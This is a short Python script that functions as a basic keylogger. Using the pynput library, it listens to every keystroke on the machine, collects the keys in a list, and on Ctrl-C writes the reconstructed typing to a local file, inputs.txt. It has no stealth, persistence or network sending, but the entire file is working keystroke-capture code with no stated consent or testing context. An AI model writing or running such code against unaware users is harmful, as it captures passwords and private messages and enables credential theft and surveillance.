from pynput import keyboard

data = []

def on_press(key):
    try:
        data.append(f'{key.char[0]}')
    except AttributeError:
        data.append(f'{key}')

def on_release(key):
    pass

def read_fix_file(data):
    with open('inputs.txt', 'a') as file:
        datal = ""
        for obj in data:
            if obj == "Key.enter":
                datal += '\n'
            elif obj in ["Key.alt", "Key.tab", "Key.shift", "Key.space"]:
                datal += " "
            else:
                datal += obj
        file.write(datal)

listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()

try:
    listener.join()
except KeyboardInterrupt as e:
    read_fix_file(data)
